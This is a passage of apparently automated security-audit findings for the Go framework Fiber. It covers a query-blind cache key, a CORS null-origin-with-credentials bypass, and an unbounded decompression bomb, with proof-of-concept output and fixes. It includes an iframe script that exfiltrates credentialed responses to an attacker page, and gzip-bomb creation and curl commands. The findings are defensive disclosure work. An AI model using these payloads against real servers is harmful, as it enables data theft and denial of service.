n\nThe cache middleware's default `KeyGenerator` constructs cache keys from\n`c.Path()` only, omitting the query string. Every distinct URL whose path\ncomponent is identical shares a single cache slot, regardless of its query\nparameters.\n\nAs a consequence, the response generated for `GET /api/profile?user=alice` is\nstored and then served verbatim to `GET /api/profile?user=bob`. Bob receives\nAlice's body, headers, and any embedded tokens — with no error, no log entry,\nand an `X-Cache: hit` header that gives no indication of the substitution.\n\nThis violates RFC 9111 Section 2, which defines the cache key as the effective\nrequest URI (scheme + host + path + **query**).\n\n## Vulnerable Code\n\n```go\n// middleware/cache/config.go:90-92\nKeyGenerator: func(c fiber.Ctx) string {\n    return utils.CopyString(c.Path())   // query string silently dropped\n},\n\n// middleware/cache/cache.go:249\nbaseKey := cfg.KeyGenerator(c) + \"_\" + requestMethod\n// result for both /api/profile?user=alice and /api/profile?user=bob:\n//   \"/api/profile_GET\"\n```\n\nThe `Vary` header mechanism (`cache.go:1278-1313`) operates on request headers\nonly and cannot compensate, because query parameters are not HTTP headers.\n\n## Attack Scenario\n\n1. A multi-tenant API uses query parameters to scope responses to individual\n   users (e.g., `?user=\u003cid\u003e`, `?account=\u003cid\u003e`, `?token=\u003cjwt\u003e`).\n2. The developer adds `app.Use(cache.New())` for performance — a common, one-line\n   integration.\n3. Alice makes the first request. Her response is cached under the key\n   `/api/profile_GET`.\n4. Bob makes the same request with a different query parameter. The middleware\n   returns Alice's cached response and sets `X-Cache: hit`.\n5. Bob now holds Alice's PII, session tokens, or other private data.\n\nNo attacker capability is required. The collision occurs passively between any\ntwo ordinary users.\n\n## Proof of Concept\n\nFile: `archon/findings/H4-cache-query-param-blind/poc_test.go`\n\n```\ngo test -v -run TestCacheQueryParamBlindness \\\n    ./archon/findings/H4-cache-query-param-blind/\n```\n\nExecution output (from `evidence/exploit.log`):\n\n```\n=== RUN   TestCacheQueryParamBlindness\n    poc_test.go:54: Request 1  user=alice  X-Cache=miss  body={\"secret\":\"token-for-alice\",\"user\":\"alice\"}\n    poc_test.go:68: Request 2  user=bob    X-Cache=hit   body={\"secret\":\"token-for-alice\",\"user\":\"alice\"}\n    poc_test.go:79: CONFIRMED: Bob received Alice's cached response verbatim: {\"secret\":\"token-for-alice\",\"user\":\"alice\"}\n    poc_test.go:90: IMPACT: Bob received Alice's secret token: {\"secret\":\"token-for-alice\",\"user\":\"alice\"}\n--- PASS: TestCacheQueryParamBlindness (0.00s)\nPASS\nok  github.com/gofiber/fiber/v3/archon/findings/H4-cache-query-param-blind 0.005s\n```\n\nThe test runs against the real `middleware/cache` stack (no mocking) and\nasserts three conditions that must all hold simultaneously:\n\n- Bob's `X-Cache` header is `hit` (came from cache, not from the handler).\n- Bob's response body is byte-for-byte identical to Alice's.\n- Bob's body contains the string `\"alice\"` and does **not** contain `\"bob\"`.\n\n## Additional Evidence: Project's Own Test Suite\n\n`middleware/cache/cache_test.go:614-621` explicitly asserts this behavior as\ncorrect — the project's own tests expect that `?id=2` returns the response\npreviously cached by `?id=1`. This confirms the behavior is structural, not a\nregression, and that there is no hidden guard against the collision.\n\n## Impact\n\n| Dimension       | Assessment                                                       |\n|-----------------|------------------------------------------------------------------|\n| Confidentiality | High — any query-scoped response can leak between users          |\n| Integrity       | None — read-only disclosure                                      |\n| Availability    | None                                                             |\n| Scope           | Unchanged — confined to the application's own response data      |\n| Exploitability  | Trivially exploitable; no special privilege required             |\n\n## Severity Discussion\n\nThe adversarial review reduced severity from HIGH to MEDIUM on the grounds that\nthe middleware is opt-in and provides an override (`KeyGenerator` config field).\nThe finding remains HIGH at the PoC stage because:\n\n- The opt-in nature of the middleware does not reduce the severity of the data\n  disclosure that occurs when it is used; it only affects prevalence.\n- The override mechanism requires the developer to know the risk exists; there\n  is no warning in the documentation, config comment, or log output.\n- The project's own test suite normalizes the behavior, making it invisible to\n  developers who read tests for guidance.\n- RFC 9111 compliance is a reasonable baseline expectation for any HTTP cache\n  implementation.\n\nFinal classification follows the adversarial reviewer's MEDIUM rating to be\nconservative.\n\n## Recommended Fix\n\nInclude the full request URI (path + query string) in the default `KeyGenerator`:\n\n```go\n// config.go\nKeyGenerator: func(c fiber.Ctx) string {\n    return utils.CopyString(c.Path() + \"?\" + string(c.Request().URI().QueryString()))\n},\n```\n\nAlternatively, use `c.OriginalURL()` which preserves the query string. Either\nchange should be accompanied by a documentation note and a migration guide for\noperators who intentionally relied on the path-only key.\n\n## Evidence Files\n\n```\narchon/findings/H4-cache-query-param-blind/\n  poc_test.go                 -- minimized exploit test\n  evidence/\n    setup.sh / setup.log      -- dependency provisioning\n    healthcheck.sh / healthcheck.log  -- build verification\n    exploit.sh / exploit.log  -- exploit execution\n    impact.log                -- annotated impact analysis\n    env-info.txt              -- toolchain and commit details\n```\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"gofiber/fiber","finding_hash":"0ad33404797860b5bb952cfd83c2742a","found_at":"2026-04-12T09:28:43.962271Z","created_at":"2026-04-12T09:28:43Z"}},{"type":"finding","data":{"id":255,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"1256fcee-8935-40c0-8158-354465bd27d1","module_id":"archon:h2","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"cors-null-origin-credentials","description":"Phase: 8\nSequence: 021\nSlug: cors-null-origin-credentials\nVerdict: VALID\nRationale: The CORS middleware lacks a guard for null origin + AllowCredentials despite having one for wildcard + AllowCredentials; this enables credentialed cross-origin requests from sandboxed iframes when AllowOriginsFunc is permissive about null origins.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-2/debate.md\n\n## Summary\n\nWhen `AllowOriginsFunc` returns true for the `\"null\"` origin and `AllowCredentials` is true, the CORS middleware emits `Access-Control-Allow-Origin: null` combined with `Access-Control-Allow-Credentials: true`. This header combination allows sandboxed iframes (from any attacker page), `file://` URLs, and opaque-redirect responses to make credentialed cross-origin requests to the API.\n\nThe framework has a guard for the analogous wildcard case (`cors.go:92-93` panics when `AllowCredentials \u0026\u0026 allowAllOrigins`) but provides no guard, warning, or documentation for the null+credentials combination.\n\n## Location\n\n- `middleware/cors/cors.go:162-167` -- AllowOriginsFunc path sets allowOrigin to \"null\"\n- `middleware/cors/cors.go:220-228` -- setSimpleHeaders emits dangerous header combination\n- `middleware/cors/cors.go:92-93` -- wildcard+credentials guard (exists but does not cover null)\n\n## Attacker Control\n\nThe attacker creates a sandboxed iframe (`\u003ciframe sandbox=\"allow-scripts allow-forms\" src=\"data:text/html,...\"\u003e`) which causes the browser to send `Origin: null`. The attacker controls the iframe content and can make credentialed fetch requests to the target API.\n\n## Trust Boundary Crossed\n\nCross-origin to same-origin: the attacker's sandboxed iframe (any origin) gains credentialed access to the target API's responses, bypassing same-origin policy.\n\n## Impact\n\nData exfiltration: the attacker can read authenticated API responses including user data, tokens, and PII. The sandboxed iframe approach works from any website, making this a universal bypass when the AllowOriginsFunc is permissive about null origins.\n\n## Evidence\n\n```go\n// cors.go:162-167 -- null origin accepted by AllowOriginsFunc\nif allowOrigin == \"\" \u0026\u0026 cfg.AllowOriginsFunc != nil \u0026\u0026 cfg.AllowOriginsFunc(originHeaderRaw) {\n    originIsSerialized, originIsNull := isOriginSerializedOrNull(originHeaderRaw)\n    if originIsSerialized || originIsNull {  // originIsNull=true for \"null\"\n        allowOrigin = originHeaderRaw         // allowOrigin = \"null\"\n    }\n}\n```\n\n```go\n// cors.go:225-227 -- dangerous header combination emitted\n} else if allowOrigin != \"\" {\n    c.Set(fiber.HeaderAccessControlAllowOrigin, allowOrigin)     // \"null\"\n    c.Set(fiber.HeaderAccessControlAllowCredentials, \"true\")\n}\n```\n\n```go\n// cors.go:92-93 -- guard exists for wildcard but NOT for null\nif cfg.AllowCredentials \u0026\u0026 allowAllOrigins {\n    panic(\"[CORS] Configuration error: When 'AllowCredentials' is set to true...\")\n}\n```\n\n## Reproduction Steps\n\n1. Configure CORS middleware with `AllowCredentials: true` and `AllowOriginsFunc: func(origin string) bool { return true }` (or any function that doesn't explicitly reject \"null\").\n2. Create an attacker page with a sandboxed iframe: `\u003ciframe sandbox=\"allow-scripts\" srcdoc=\"\u003cscript\u003efetch('https://target-api/user', {credentials: 'include'}).then(r=\u003er.json()).then(d=\u003eparent.postMessage(d,'*'))\u003c/script\u003e\"\u003e\u003c/iframe\u003e`\n3. The iframe sends `Origin: null` to the target API.\n4. The CORS middleware responds with `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true`.\n5. The browser allows the credentialed cross-origin request and the attacker reads the response.\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: Unit test reproduction confirms Access-Control-Allow-Origin: null + Access-Control-Allow-Credentials: true emitted when AllowOriginsFunc accepts \"null\" with AllowCredentials enabled; framework guards wildcard+credentials but not null+credentials.\nSeverity-Final: MEDIUM\nPoC-Status: executed\n\n### Code Path Trace (independent)\n\nTraced from `cors.go` handler entry to `setSimpleHeaders` output:\n1. `allowAllOrigins` = false (AllowOriginsFunc is set, AllowOrigins is empty) -- line 62\n2. Wildcard+credentials panic guard at line 92-93 does NOT fire\n3. `originHeaderRaw` = \"null\" -- line 112\n4. Static origin checks at lines 144-157 find no match; `allowOrigin` stays \"\"\n5. `AllowOriginsFunc(\"null\")` returns true at line 162; `isOriginSerializedOrNull(\"null\")` returns (false, true) at line 163-164\n6. `allowOrigin` = \"null\" at line 165\n7. `setSimpleHeaders` at line 225-227: since `allowOrigin` is \"null\" (not \"*\", not \"\"), sets both `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`\n\nNo validation, sanitization, or guard blocks the null+credentials combination at any point in the path.\n\n### Protections Assessed\n\n- **Wildcard guard (line 92-93)**: Only checks `allowAllOrigins` flag; does not cover null origin. NOT blocking.\n- **`isOriginSerializedOrNull`**: Explicitly accepts \"null\" as valid. NOT blocking.\n- **Default configuration**: `AllowCredentials` defaults to false, `AllowOriginsFunc` defaults to nil. The vulnerability requires non-default config. This is a severity-reducing factor, not a blocking protection.\n\n### Reproduction Result\n\nGo test with `AllowCredentials: true` and `AllowOriginsFunc: func(string) bool { return true }` confirmed:\n- `Access-Control-Allow-Origin: \"null\"`\n- `Access-Control-Allow-Credentials: \"true\"`\n\nEvidence: `archon/real-env-evidence/cors-null-origin-credentials/test.go`\n\n### Severity Rationale\n\nDowngraded from HIGH to MEDIUM because the vulnerability requires non-default configuration (`AllowCredentials: true` plus a permissive `AllowOriginsFunc`). While the configuration is plausible in real applications and the framework creates a false sense of security by guarding wildcard+credentials but not null+credentials, the configuration dependency prevents escalation beyond MEDIUM.\n\n\n---\n\n# H2: CORS Null Origin + AllowCredentials Produces Credentialed Cross-Origin Bypass\n\n**ID:** H2  \n**Severity:** HIGH (cold review consensus: MEDIUM -- see Severity Discussion)  \n**Component:** `middleware/cors` -- `cors.go`  \n**Status:** Confirmed, PoC executed  \n**CWE:** CWE-346 (Origin Validation Error)  \n**CVSS 3.1:** 7.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N) -- *requires user interaction (victim visits attacker page)*\n\n---\n\n## Summary\n\nThe Fiber CORS middleware reflects the literal string `\"null\"` as `Access-Control-Allow-Origin: null` while simultaneously emitting `Access-Control-Allow-Credentials: true` whenever `AllowOriginsFunc` accepts the null origin and `AllowCredentials` is enabled. Browsers treat this header pair as an explicit grant of credentialed cross-origin access. Because the null origin is sent by sandboxed iframes, `file://` URLs, and opaque redirect chains -- all of which an attacker fully controls -- this is a universal credentialed CORS bypass requiring no prior knowledge of the victim's session.\n\nThe framework already guards the analogous wildcard+credentials combination with a startup panic (`cors.go:92-93`). No equivalent protection exists for the null+credentials path, creating an asymmetric safety net that misleads developers.\n\n---\n\n## Affected Code\n\n| File | Lines | Role |\n|------|-------|------|\n| `middleware/cors/cors.go` | 162-167 | `AllowOriginsFunc` path sets `allowOrigin = \"null\"` |\n| `middleware/cors/cors.go` | 225-227 | `setSimpleHeaders` emits `ACAO: null` + `ACAC: true` |\n| `middleware/cors/cors.go` | 92-93 | Wildcard+credentials panic guard (null is NOT covered) |\n\n---\n\n## Vulnerability Details\n\n### Code Path\n\n```\ncors.New() startup\n  line 62:  allowAllOrigins = false  (AllowOrigins empty, AllowOriginsFunc is set)\n  line 92:  AllowCredentials \u0026\u0026 allowAllOrigins -\u003e false, panic guard SKIPS\n\nper-request handler\n  line 112: originHeaderRaw = \"null\"\n  line 144: slices.Contains(allowOrigins, \"null\") -\u003e false\n  line 162: AllowOriginsFunc(\"null\") -\u003e true\n  line 163: isOriginSerializedOrNull(\"null\") -\u003e (false, true)  [originIsNull = true]\n  line 165: allowOrigin = \"null\"\n  line 176: setSimpleHeaders(c, \"null\", \u0026cfg)\n\nsetSimpleHeaders (line 214)\n  line 220: cfg.AllowCredentials == true\n  line 225: allowOrigin == \"null\"  (not \"*\", not \"\")\n  line 226: c.Set(\"Access-Control-Allow-Origin\", \"null\")     \u003c- emitted\n  line 227: c.Set(\"Access-Control-Allow-Credentials\", \"true\") \u003c- emitted\n```\n\nNo guard, sanitization, or warning intercepts this path.\n\n### Asymmetric Safety Net\n\n```go\n// cors.go:92-93 -- DOES exist for wildcard\nif cfg.AllowCredentials \u0026\u0026 allowAllOrigins {\n    panic(\"[CORS] Configuration error: When 'AllowCredentials' is set to true, \" +\n        \"'AllowOrigins' cannot contain a wildcard origin '*'...\")\n}\n\n// DOES NOT exist for null -- missing guard:\n// if cfg.AllowCredentials \u0026\u0026 allowOrigin == \"null\" {\n//     panic or warn\n// }\n```\n\nPoC test `TestNullOriginCredentials_AsymmetricGuard` confirms:\n- `AllowOrigins: [\"*\"] + AllowCredentials: true` panics at startup (guarded).\n- `AllowOriginsFunc: func(string)bool{return true} + AllowCredentials: true` starts silently (unguarded).\n\n---\n\n## Proof of Concept\n\n**Location:** `archon/findings/H2-cors-null-origin-credentials/poc_test.go`\n\n**Run:**\n```bash\ncd archon/findings/H2-cors-null-origin-credentials\ngo test -v -run \"TestNullOriginCredentials\" .\n```\n\n**Vulnerable configuration:**\n```go\napp.Use(cors.New(cors.Config{\n    AllowCredentials: true,\n    AllowOriginsFunc: func(origin string) bool {\n        return true  // common pattern: dynamic origin allowlist\n    },\n}))\n```\n\n**Attacker request:**\n```\nGET /api/user HTTP/1.1\nOrigin: null          \u003c- browser sends this for sandboxed iframes\n```\n\n**Server response (confirmed):**\n```\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\nContent-Type: application/json\n\n{\"token\":\"secret-session-token\",\"user\":\"alice\"}\n```\n\n**Preflight also confirmed (204):**\n```\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Methods: GET, POST, HEAD, PUT, DELETE, PATCH\n```\n\n---\n\n## Execution Evidence\n\nAll evidence files at `archon/findings/H2-cors-null-origin-credentials/evidence/`:\n\n| File | Contents |\n|------|----------|\n| `exploit.log` | Full `go test -v` output -- all three tests PASS |\n| `impact.log` | Security impact narrative and exfiltration scenario |\n| `setup.log` | Environment provisioning output |\n| `healthcheck.log` | Module build verification |\n| `env-info.txt` | Go version, OS, arch |\n\nKey output from `exploit.log`:\n\n```\n=== RUN   TestNullOriginCredentials_SimpleRequest\n    Access-Control-Allow-Origin:       \"null\"\n    Access-Control-Allow-Credentials:  \"true\"\n    Body:                              {\"token\":\"secret-session-token\",\"user\":\"alice\"}\n    CONFIRMED: null+credentials combination emitted on simple request.\n--- PASS: TestNullOriginCredentials_SimpleRequest (0.00s)\n\n=== RUN   TestNullOriginCredentials_Preflight\n    Access-Control-Allow-Origin:       \"null\"\n    Access-Control-Allow-Credentials:  \"true\"\n    CONFIRMED: null+credentials combination emitted on preflight request.\n--- PASS: TestNullOriginCredentials_Preflight (0.00s)\n\n=== RUN   TestNullOriginCredentials_AsymmetricGuard\n    Wildcard+credentials panics as expected: [CORS] Configuration error: ...\n    CONFIRMED: null+credentials starts silently with no panic and no warning.\n--- PASS: TestNullOriginCredentials_AsymmetricGuard (0.00s)\n```\n\n---\n\n## Attack Scenario\n\n1. Victim is authenticated to `https://api.example.com`. Their session cookie is `HttpOnly; Secure; SameSite=None`.\n2. Victim visits attacker page `https://evil.example.com`.\n3. Attacker page embeds:\n   ```html\n   \u003ciframe sandbox=\"allow-scripts allow-forms\" srcdoc=\"\n     \u003cscript\u003e\n       fetch('https://api.example.com/api/user', {credentials: 'include'})\n         .then(r =\u003e r.json())\n         .then(data =\u003e parent.postMessage(JSON.stringify(data), '*'))\n     \u003c/script\u003e\n   \"\u003e\u003c/iframe\u003e\n   ```\n4. Browser sends `Origin: null` because the iframe is sandboxed.\n5. Server responds with `ACAO: null` + `ACAC: true`.\n6. Browser grants the iframe read access to the response body.\n7. Attacker receives `{\"token\":\"secret-session-token\",\"user\":\"alice\"}` via `postMessage`.\n\nThe attack requires only that the victim visit a single attacker-controlled URL -- no interaction beyond page load.\n\n---\n\n## Impact\n\n- **Confidentiality:** HIGH -- attacker reads authenticated API responses including tokens, PII, and session-bound data.\n- **Integrity:** LOW -- credentialed write requests are also possible (POST with credentials), but response reading is the primary impact.\n- **Availability:** NONE.\n- **Scope:** Any application using `AllowCredentials: true` with an `AllowOriginsFunc` that does not explicitly reject the string `\"null\"`.\n\n---\n\n## Remediation\n\n### Option 1 -- Guard at configuration time (recommended)\n\nMirror the existing wildcard+credentials panic:\n\n```go\n// In cors.New(), after the wildcard guard at line 92:\nif cfg.AllowCredentials \u0026\u0026 cfg.AllowOriginsFunc != nil {\n    // Wrap AllowOriginsFunc to reject null origin\n    userFunc := cfg.AllowOriginsFunc\n    cfg.AllowOriginsFunc = func(origin string) bool {\n        if origin == \"null\" {\n            return false\n        }\n        return userFunc(origin)\n    }\n    log.Warn(\"[CORS] AllowOriginsFunc will never grant credentialed access to the 'null' origin.\")\n}\n```\n\n### Option 2 -- Guard at request time\n\nIn the `AllowOriginsFunc` handling block (cors.go:162-167):\n\n```go\nif allowOrigin == \"\" \u0026\u0026 cfg.AllowOriginsFunc != nil \u0026\u0026 cfg.AllowOriginsFunc(originHeaderRaw) {\n    originIsSerialized, originIsNull := isOriginSerializedOrNull(originHeaderRaw)\n    if originIsNull \u0026\u0026 cfg.AllowCredentials {\n        // Null origin + credentials is never safe; skip without allowing\n    } else if originIsSerialized || originIsNull {\n        allowOrigin = originHeaderRaw\n    }\n}\n```\n\n### Option 3 -- Documentation (minimum viable)\n\nAdd an explicit warning in the `Config` struct documentation for `AllowOriginsFunc`:\n\n\u003e Warning: if `AllowCredentials` is true and `AllowOriginsFunc` returns true for the string `\"null\"`, the middleware will emit `Access-Control-Allow-Origin: null` with `Access-Control-Allow-Credentials: true`. This is unsafe. Always return false for `origin == \"null\"` when credentials are enabled.\n\n---\n\n## Severity Discussion\n\n**Original severity:** HIGH  \n**Cold review consensus:** MEDIUM\n\nDowngrade rationale: the vulnerability requires two non-default configuration choices (`AllowCredentials: true` and a permissive `AllowOriginsFunc`). Neither is set by default. Developers who set both are making an intentional decision, even if they do not realize `\"null\"` will be accepted.\n\nCounter-argument for HIGH: the asymmetric safety net (wildcard guarded, null unguarded) is precisely what leads developers into the trap. The framework trains developers to trust it will catch dangerous combinations. The silent acceptance of null+credentials violates that expectation and is the proximate cause of the vulnerability being introduced in production.\n\nThe PoC team retains the original H2 assignment (HIGH) because the exploit is universal (any attacker page, no prior knowledge required), the impact is full authenticated response exfiltration, and the missing guard is a framework defect rather than a developer error.\n\n---\n\n## PoC Status\n\n**PoC-Status:** executed  \n**Execution environment:** Go 1.25.0 / linux/amd64, fiber module from local source  \n**Test results:** 3/3 PASS  \n**Evidence directory:** `archon/findings/H2-cors-null-origin-credentials/evidence/`\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite"],"status":"open","cvss_score":0,"repo_name":"gofiber/fiber","finding_hash":"832cb6c1a49ce21ffb6f2339ca3032b8","found_at":"2026-04-12T09:28:43.96227Z","created_at":"2026-04-12T09:28:43Z"}},{"type":"finding","data":{"id":254,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"1256fcee-8935-40c0-8158-354465bd27d1","module_id":"archon:h1","module_name":"","module_type":"whitebox","finding_source":"archon","module_short":"decompression-bomb","description":"Phase: 8\nSequence: 001\nSlug: decompression-bomb\nVerdict: VALID\nRationale: Remotely triggerable memory exhaustion DoS with no decompressed output limit; BodyLimit only caps compressed input. No blocking protection found after exhaustive 5-layer search by Advocate.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-1/debate.md\n\n## Summary\n\nThe `tryDecodeBodyInOrder` function in `req.go` calls fasthttp's decompression functions (`BodyGunzip()`, `BodyUnbrotli()`, `BodyInflate()`, `BodyUnzstd()`) without any cap on the decompressed output size. FastHTTP's `BodyGunzip()` internally calls `BodyGunzipWithLimit(0)` where limit 0 means \"no limit.\" The framework's `BodyLimit` configuration (default 4MB) only limits the compressed wire-format input, not the decompressed output. A 4MB gzip bomb can decompress to 100MB-4GB+ depending on compression ratio.\n\nAdditionally, `tryDecodeBodyInOrder` supports chained encodings (up to 3 via `Content-Encoding: gzip, gzip, gzip`), where each decompression layer's output feeds the next via `request.SetBodyRaw(body)` (lines 131-138), creating multiplicative amplification.\n\n## Location\n\n- `req.go:100-142` -- `tryDecodeBodyInOrder` function\n- `req.go:112` -- `request.BodyGunzip()` (gzip decompression, no limit)\n- `req.go:114` -- `request.BodyUnbrotli()` (brotli decompression, no limit)\n- `req.go:116` -- `request.BodyInflate()` (deflate decompression, no limit)\n- `req.go:118` -- `request.BodyUnzstd()` (zstd decompression, no limit)\n- `req.go:149-196` -- `Body()` function that calls `tryDecodeBodyInOrder`\n\n## Attacker Control\n\nFull. The `Content-Encoding` header and compressed request body are entirely attacker-controlled. Any unauthenticated HTTP request to any endpoint whose handler (directly or indirectly) calls `c.Body()`, `Bind.JSON()`, `Bind.Form()`, `Bind.XML()`, `Bind.MsgPack()`, or `Bind.CBOR()` triggers the decompression path.\n\n## Trust Boundary Crossed\n\nInternet -\u003e server memory allocation. An unauthenticated external attacker can force unbounded memory allocation on the server by sending a compressed request body within the wire-format `BodyLimit`.\n\n## Impact\n\n- **Memory exhaustion DoS**: A single request with a 4MB gzip bomb can allocate 100MB-4GB+ of server memory, leading to OOM kill of the process.\n- **Chained amplification**: `Content-Encoding: gzip, gzip` triggers double decompression, squaring the amplification ratio.\n- **Pre-auth**: Any endpoint that reads the body is vulnerable. Combined with TrustProxy IP spoofing (p8-006), the attacker can bypass rate limiting to send unlimited bomb requests.\n- **Scope**: Affects every Fiber application that reads request bodies with Content-Encoding support (the default behavior).\n\n## Evidence\n\n```go\n// req.go:110-118\nswitch encoding {\ncase StrGzip, \"x-gzip\":\n    body, decodeErr = request.BodyGunzip()      // calls BodyGunzipWithLimit(0) -- NO LIMIT\ncase StrBr, StrBrotli:\n    body, decodeErr = request.BodyUnbrotli()     // no limit\ncase StrDeflate:\n    body, decodeErr = request.BodyInflate()      // no limit\ncase StrZstd:\n    body, decodeErr = request.BodyUnzstd()       // no limit\n```\n\n```go\n// req.go:131-138 -- chained decompression feeds output to next layer\nif i \u003e 0 \u0026\u0026 decodesRealized \u003e 0 {\n    if i == len(encodings)-1 {\n        tempBody := request.Body()\n        *originalBody = make([]byte, len(tempBody))\n        copy(*originalBody, tempBody)\n    }\n    request.SetBodyRaw(body)  // decompressed output becomes input for next layer\n}\n```\n\nFastHTTP source confirms `BodyGunzip()` calls `BodyGunzipWithLimit(0)` and limit 0 means no decompressed size cap.\n\n## Reproduction Steps\n\n1. Create a gzip bomb: `dd if=/dev/zero bs=1M count=100 | gzip \u003e bomb.gz` (100MB of zeros compresses to ~100KB)\n2. Send to any Fiber endpoint that reads the body:\n   ```\n   curl -X POST http://target/any-endpoint \\\n     -H \"Content-Encoding: gzip\" \\\n     -H \"Content-Type: application/json\" \\\n     --data-binary @bomb.gz\n   ```\n3. Observe server memory spike to 100MB+ per request\n4. For chained decompression: double-compress the bomb and send with `Content-Encoding: gzip, gzip`\n5. Monitor server memory via `top` or container metrics -- process will OOM kill\n\n**Fix recommendation**: Replace `request.BodyGunzip()` with `request.BodyGunzipWithLimit(r.c.app.config.BodyLimit)` in `tryDecodeBodyInOrder` (req.go:112). Apply the same fix for brotli (line 114), deflate (line 116), and zstd (line 118). This ensures the decompressed output is capped at the same limit as the compressed input.\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: Real-environment reproduction succeeded 3/3 times; 508KB compressed payload caused 1.37GB memory allocation with no protection at any layer.\nSeverity-Final: HIGH\nPoC-Status: executed\n\n### Independent Code Path Trace\n\nIndependently traced from HTTP entry to decompression sink:\n\n1. `app.go:1345` -- `BodyLimit` sets `MaxRequestBodySize` on **compressed** wire input only (default 4MB)\n2. `req.go:149` -- `Body()` reads `Content-Encoding` header (attacker-controlled)\n3. `req.go:178` -- calls `tryDecodeBodyInOrder`\n4. `req.go:112` -- calls `request.BodyGunzip()` with no size limit\n5. fasthttp `http.go:494` -- `BodyGunzip()` calls `BodyGunzipWithLimit(0)` where 0 = no limit\n\nNo validation, sanitization, or decompressed-size limit exists anywhere on this path.\n\n### Protection Surface Search Result\n\nNo blocking protection found at any layer (language, framework, middleware, application, documentation).\n\n### Reproduction Evidence\n\n| Attempt | Compressed Size | Decompressed Size | Memory Delta | Encoding Header |\n|---------|----------------|-------------------|-------------|-----------------|\n| 1 | 50KB | 50MB | 97MB | gzip |\n| 2 | 113B | 10MB | 55MB | gzip, gzip |\n| 3 | 508KB | 500MB | 1.37GB | gzip |\n\nAll three attempts succeeded on a test server built against current `main` (`fe757ead`).\n\n### Verdict\n\nThe finding is **CONFIRMED**. The vulnerability is genuine, trivially exploitable by any unauthenticated attacker, and no protection exists at any layer. The prosecution brief survives the defense -- the only mitigations are non-default external controls (rate limiting, WAFs) that do not address the root cause. Severity HIGH is warranted: remotely triggerable, crosses trust boundary, no preconditions beyond a handler that reads the body.\n\nFull adversarial review: `archon/adversarial-reviews/decompression-bomb-review.md`\n\n\n---\n\n# H1 -- Decompression Bomb: Unbounded Memory Allocation via Content-Encoding\n\n| Field          | Value                                                                     |\n|----------------|---------------------------------------------------------------------------|\n| ID             | H1                                                                        |\n| Severity       | HIGH                                                                      |\n| Status         | Confirmed (executed PoC)                                                  |\n| Component      | `req.go` -- `tryDecodeBodyInOrder` / `Body()`                            |\n| Affected scope | Every Fiber application that calls `c.Body()` or any binder              |\n| Commit tested  | `fe757ead` (main, 2026-04-11)                                            |\n| fasthttp       | v1.70.0                                                                   |\n| PoC-Status     | executed                                                                  |\n\n---\n\n## Executive Summary\n\nFiber's `BodyLimit` configuration (default 4 MiB) restricts the **compressed** wire-format\nrequest body received from the network. It does not restrict the **decompressed** output\nallocated in server memory. The decompression functions called by `tryDecodeBodyInOrder`\n(`BodyGunzip`, `BodyUnbrotli`, `BodyInflate`, `BodyUnzstd`) all delegate to fasthttp\nequivalents that accept a `maxBodySize` parameter, and all are called with `0` -- which\nfasthttp documents as \"no limit applied.\"\n\nA single unauthenticated HTTP request carrying a 49.8 KiB gzip payload caused +92.4 MiB\nof heap allocation on the server in the executed PoC. Scaling to the full 4 MiB wire limit\nwould produce proportionally larger allocations. Multiple concurrent requests exhaust\navailable memory, OOM-killing the process.\n\n---\n\n## Vulnerability Details\n\n### Root Cause\n\n`req.go:112`:\n```go\ncase StrGzip, \"x-gzip\":\n    body, decodeErr = request.BodyGunzip()\n```\n\n`fasthttp/http.go:494-495`:\n```go\nfunc (req *Request) BodyGunzip() ([]byte, error) {\n    return req.BodyGunzipWithLimit(0)\n}\n```\n\n`fasthttp/http.go:498-501` (comment):\n```\n// BodyGunzipWithLimit returns un-gzipped body data and limits the size\n// of uncompressed body data to maxBodySize bytes.\n//\n// If maxBodySize \u003c= 0, then no limit is applied.\n```\n\nThe same pattern holds for all four codecs:\n\n| Line | Call | Limit |\n|------|------|-------|\n| `req.go:112` | `request.BodyGunzip()` | none -- calls `BodyGunzipWithLimit(0)` |\n| `req.go:114` | `request.BodyUnbrotli()` | none |\n| `req.go:116` | `request.BodyInflate()` | none |\n| `req.go:118` | `request.BodyUnzstd()` | none |\n\n### Chained Encoding Amplification\n\n`tryDecodeBodyInOrder` iterates over the `Content-Encoding` header value which may contain\nmultiple tokens (e.g., `gzip, gzip`). After each decompression pass the output is fed back\nas the input for the next pass via `request.SetBodyRaw(body)` (`req.go:137`). Each layer\nmultiplies the decompressed size with no cap applied at any layer.\n\n### Trust Boundary\n\n```\nInternet  ──HTTP POST──\u003e  Fiber server\n                          c.Body() called by any handler\n                          tryDecodeBodyInOrder() -- no limit\n                          heap grows proportionally to decompressed size\n```\n\nNo authentication, role, or application-level control is required. Any publicly accessible\nendpoint that reads the body is reachable.\n\n---\n\n## PoC Execution Results\n\nThe PoC (`evidence/poc.go`) starts a real Fiber server, sends a gzip-compressed payload,\nand measures heap growth before and after the request.\n\n### Single gzip request\n\n| Metric | Value |\n|--------|-------|\n| Compressed wire payload | 49.8 KiB |\n| Passes BodyLimit check | Yes (49.8 KiB \u003c 4 MiB) |\n| `decompressed_len` in response | 52 428 800 bytes (50 MiB) |\n| Heap before | 0.3 MiB |\n| Heap after | 92.7 MiB |\n| Heap delta | **+92.4 MiB** |\n| Amplification ratio | ~1850:1 (wire bytes to heap bytes) |\n| Request latency | 174 ms |\n\n### Chained encoding (`Content-Encoding: gzip, gzip`)\n\n| Metric | Value |\n|--------|-------|\n| Double-compressed wire payload | 0.3 KiB |\n| Passes BodyLimit check | Yes |\n| `decompressed_len` in 